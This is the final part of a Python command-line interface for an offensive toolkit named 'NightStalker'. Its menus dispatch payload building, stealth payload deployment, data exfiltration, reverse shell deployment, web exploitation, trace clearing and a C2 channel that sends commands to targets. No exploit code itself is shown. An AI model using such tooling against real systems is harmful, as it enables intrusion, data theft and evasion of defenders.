        elif args.c2_cmd == 'send':
            print("\n💻 Sending command to target...")
            target_id = args.target_id
            command = args.command
            timeout = args.timeout
            
            if not target_id:
                print("❌ Target ID is required.")
                return 1
            
            if not command:
                print("❌ Command is required.")
                return 1
            
            try:
                command_id = c2.send_command(target_id, command, timeout)
                print(f"✅ Command '{command}' sent to target {target_id} with ID: {command_id}")
                print(f"🎯 Command ID: {command_id}")
            except Exception as e:
                print(f"❌ Failed to send command: {e}")
                return 1
        
        elif args.c2_cmd == 'results':
            print("\n📦 Getting command results...")
            target_id = args.target_id
            command_id = args.command_id
            
            if not target_id:
                print("❌ Target ID is required.")
                return 1
            
            try:
                results = c2.get_results(target_id, command_id)
                print(f"✅ Command results for target {target_id}, ID {command_id}:")
                print(json.dumps(results, indent=4))
            except Exception as e:
                print(f"❌ Failed to get command results: {e}")
                return 1
        
        return 0

    def show_interactive_menu(self):
        """Show interactive menu for NightStalker CLI"""
        while True:
            print("""
╔══════════════════════════════════════════════════════════════╗
║                    🌙 NIGHTSTALKER CLI                       ║
║                    Advanced Offensive Security Framework      ║
╚══════════════════════════════════════════════════════════════╝

📋 Available Commands:
  1. 🎯 Payload Building
  2. 🥷 Stealth Payloads  
  3. 🔍 Penetration Testing
  4. 🦠 Red Team Operations
  5. 📤 Data Exfiltration
  6. 👁️  File Monitoring
  7. 🌍 Environment Management
  8. 🌐 Web Red Teaming
  9. 🔗 Reverse Shell Deployer
  10. 🎮 Command & Control (C2)
  11. ❓ Help & Documentation
  12. 🚪 Exit

""")
            
            try:
                choice = input("🎯 Select option (1-12): ").strip()
                
                if choice == '1':
                    self._handle_payload_menu()
                elif choice == '2':
                    self._handle_stealth_menu()
                elif choice == '3':
                    self._handle_pentest_menu()
                elif choice == '4':
                    self._handle_redteam_menu()
                elif choice == '5':
                    self._handle_exfil_menu()
                elif choice == '6':
                    self._handle_monitor_menu()
                elif choice == '7':
                    self._handle_env_menu()
                elif choice == '8':
                    self._handle_webred_menu()
                elif choice == '9':
                    self._handle_reverse_shell_menu()
                elif choice == '10':
                    self._handle_c2_menu()
                elif choice == '11':
                    self.print_detailed_help()
                elif choice == '12':
                    print("👋 Goodbye!")
                    break
                else:
                    print("❌ Invalid choice. Please select 1-12.")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

    def _handle_payload_menu(self):
        """Handle payload menu"""
        while True:
            print("\n💾 Payloads:")
            print("  1. Build payload")
            print("  2. List available payloads")
            print("  3. Clean built payloads")
            print("  4. Back to main menu")
            choice = input("Select option (1-4): ").strip()
            if choice == '1':
                args = argparse.Namespace(payload_cmd='build')
                self._handle_payload(args)
            elif choice == '2':
                args = argparse.Namespace(payload_cmd='list')
                self._handle_payload(args)
            elif choice == '3':
                args = argparse.Namespace(payload_cmd='clean')
                self._handle_payload(args)
            elif choice == '4':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-4.")

    def _handle_stealth_menu(self):
        """Handle stealth menu"""
        while True:
            print("\n🕵️ Stealth Server:")
            print("  1. Build stealth payload")
            print("  2. Deploy stealth payload")
            print("  3. Start C2 server")
            print("  4. Run demo")
            print("  5. List configurations")
            print("  6. Test payload")
            print("  7. Back to main menu")
            choice = input("Select option (1-7): ").strip()
            if choice == '1':
                args = argparse.Namespace(stealth_cmd='build')
                self._handle_stealth(args)
            elif choice == '2':
                args = argparse.Namespace(stealth_cmd='deploy')
                self._handle_stealth(args)
            elif choice == '3':
                args = argparse.Namespace(stealth_cmd='server')
                self._handle_stealth(args)
            elif choice == '4':
                args = argparse.Namespace(stealth_cmd='demo')
                self._handle_stealth(args)
            elif choice == '5':
                args = argparse.Namespace(stealth_cmd='list')
                self._handle_stealth(args)
            elif choice == '6':
                args = argparse.Namespace(stealth_cmd='test')
                self._handle_stealth(args)
            elif choice == '7':
                return
            else:
                print("Invalid option. Please select 1-7.")

    def _handle_pentest_menu(self):
        """Handle penetration testing menu"""
        while True:
            print("\n🔍 Penetration Testing Options:")
            print("  1. Run full penetration test")
            print("  2. Back to main menu")
            
            choice = input("Select option (1-2): ").strip()
            
            if choice == '1':
                target = input("Enter target IP/CIDR: ").strip()
                chain = input("Enter attack chain (smb_exploit/web_exploit/full_chain): ").strip() or "full_chain"
                
                args = argparse.Namespace(
                    target=target,
                    chain=chain
                )
                self._handle_pentest(args)
                
            elif choice == '2':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-2.")

    def _handle_redteam_menu(self):
        """Handle red team menu"""
        while True:
            print("\n🔴 Red Team Operations:")
            print("  1. Attack target")
            print("  2. Fuzz target")
            print("  3. Back to main menu")
            choice = input("Select option (1-3): ").strip()
            if choice == '1':
                args = argparse.Namespace(red_cmd='attack')
                self._handle_redteam(args)
            elif choice == '2':
                args = argparse.Namespace(red_cmd='fuzz')
                self._handle_redteam(args)
            elif choice == '3':
                return
            else:
                print("Invalid option. Please select 1-3.")

    def _handle_exfil_menu(self):
        """Handle data exfiltration menu"""
        while True:
            print("\n📤 Data Exfiltration:")
            print("  1. Exfiltrate data")
            print("  2. Back to main menu")
            
            choice = input("Select option (1-2): ").strip()
            
            if choice == '1':
                data_file = input("Enter data file path: ").strip()
                channels = input("Enter channels (space-separated): ").strip().split() or ['https', 'dns']
                
                args = argparse.Namespace(
                    data=data_file,
                    channels=channels
                )
                self._handle_exfil(args)
                
            elif choice == '2':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-2.")

    def _handle_monitor_menu(self):
        """Handle file monitoring menu"""
        while True:
            print("\n👁️  File Monitoring:")
            print("  1. Start monitoring")
            print("  2. Back to main menu")
            
            choice = input("Select option (1-2): ").strip()
            
            if choice == '1':
                paths = input("Enter paths to monitor (space-separated): ").strip()
                if paths:
                    paths = paths.split()
                else:
                    paths = ['/tmp']
                
                args = argparse.Namespace(paths=paths)
                self._handle_monitor(args)
                
            elif choice == '2':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-2.")

    def _handle_env_menu(self):
        """Handle environment management menu"""
        while True:
            print("\n🌍 Environment Management:")
            print("  1. Show status")
            print("  2. Enable portable mode")
            print("  3. Perform cleanup")
            print("  4. Back to main menu")
            
            choice = input("Select option (1-4): ").strip()
            
            if choice == '1':
                args = argparse.Namespace(status=True)
                self._handle_env(args)
                
            elif choice == '2':
                usb_path = input("Enter USB drive path: ").strip()
                
                args = argparse.Namespace(portable=True, usb_path=usb_path)
                self._handle_env(args)
                
            elif choice == '3':
                args = argparse.Namespace(cleanup=True)
                self._handle_env(args)
                
            elif choice == '4':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-4.")

    def _handle_webred_menu(self):
        """Handle web red teaming menu"""
        while True:
            print("\n🌐 Web Red Teaming:")
            print("  1. Scan target")
            print("  2. Exploit vulnerability")
            print("  3. Post-exploitation")
            print("  4. Clear traces")
            print("  5. Generate report")
            print("  6. Back to main menu")
            
            choice = input("Select option (1-6): ").strip()
            
            if choice == '1':
                url = input("Enter target URL: ").strip()
                
                args = argparse.Namespace(
                    webred_cmd='scan',
                    url=url
                )
                self._handle_webred(args)
                
            elif choice == '2':
                url = input("Enter target URL: ").strip()
                exploit = input("Enter exploit type (sqlmap/xss/lfi/rfi/upload): ").strip()
                
                args = argparse.Namespace(
                    webred_cmd='exploit',
                    url=url,
                    exploit=exploit
                )
                self._handle_webred(args)
                
            elif choice == '3':
                target_info = input("Enter target info file: ").strip()
                
                args = argparse.Namespace(
                    webred_cmd='post-exploit',
                    target_info=target_info
                )
                self._handle_webred(args)
                
            elif choice == '4':
                target_info = input("Enter target info file: ").strip()
                
                args = argparse.Namespace(
                    webred_cmd='clear-traces',
                    target_info=target_info
                )
                self._handle_webred(args)
                
            elif choice == '5':
                input_file = input("Enter input results file: ").strip()
                output_file = input("Enter output report file: ").strip()
                
                args = argparse.Namespace(
                    webred_cmd='report',
                    input=input_file,
                    output=output_file
                )
                self._handle_webred(args)
                
            elif choice == '6':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-6.")

    def _handle_reverse_shell_menu(self):
        """Handle reverse shell menu"""
        while True:
            print("\n🔗 Reverse Shell Deployer:")
            print("  1. Deploy reverse shell")
            print("  2. List available types")
            print("  3. Back to main menu")
            
            choice = input("Select option (1-3): ").strip()
            
            if choice == '1':
                args = argparse.Namespace(reverse_shell_cmd='deploy')
                self._handle_reverse_shell(args)
                
            elif choice == '2':
                args = argparse.Namespace(reverse_shell_cmd='list')
                self._handle_reverse_shell(args)
                
            elif choice == '3':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-3.")

    def _handle_c2_menu(self):
        """Handle C2 menu"""
        while True:
            print("\n🎮 Command & Control (C2):")
            print("  1. Deploy C2 server")
            print("  2. Send command")
            print("  3. List targets")
            print("  4. Back to main menu")
            
            choice = input("Select option (1-4): ").strip()
            
            if choice == '1':
                args = argparse.Namespace(c2_cmd='deploy')
                self._handle_c2(args)
                
            elif choice == '2':
                target_id = input("Enter target ID: ").strip()
                command = input("Enter command: ").strip()
                
                args = argparse.Namespace(
                    c2_cmd='send',
                    target_id=target_id,
                    command=command
                )
                self._handle_c2(args)
                
            elif choice == '3':
                args = argparse.Namespace(c2_cmd='list')
                self._handle_c2(args)
                
            elif choice == '4':
                return  # Return to main menu
            else:
                print("Invalid option. Please select 1-4.")


def main():
    """Main entry point for NightStalker CLI"""
    cli = NightStalkerCLI()
    
    # If no arguments provided, show interactive menu
    if len(sys.argv) == 1:
        while True:
            print("\n🌙 NIGHTSTALKER MAIN MENU")
            print("=" * 40)
            print("1. Payloads")
            print("2. Stealth Server")
            print("3. Stealth Payload Builder")
            print("4. Red Team Operations")
            print("5. Web Red Teaming")
            print("6. C2 Operations")
            print("7. Exit")
            try:
                choice = input("\nSelect an option (1-7): ").strip()
                if choice == '1':
                    cli._handle_payload_menu()
                elif choice == '2':
                    cli._handle_stealth_menu()
                elif choice == '3':
                    cli._handle_stealth_menu()
                elif choice == '4':
                    cli._handle_redteam_menu()
                elif choice == '5':
                    cli._handle_webred_menu()
                elif choice == '6':
                    cli._handle_c2_menu()
                elif choice == '7':
                    print("Exiting NightStalker. Goodbye!")
                    return 0
                else:
                    print("Invalid option. Please select 1-7.")
            except KeyboardInterrupt:
                print("\n\nExiting NightStalker. Goodbye!")
                return 0
            except Exception as e:
                print(f"\n[!] Error: {e}")
                continue
        
    try:
        parsed_args = cli.parser.parse_args()
        # Handle verbose logging
        if parsed_args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        elif parsed_args.quiet:
            logging.getLogger().setLevel(logging.ERROR)
        # Handle log file
        if parsed_args.log_file:
            file_handler = logging.FileHandler(parsed_args.log_file)
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logging.getLogger().addHandler(file_handler)
        # Load configuration if specified
        if parsed_args.config:
            pass
        return cli.run()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        return 1
    except Exception as e:
        logger.error(f"CLI error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main()) 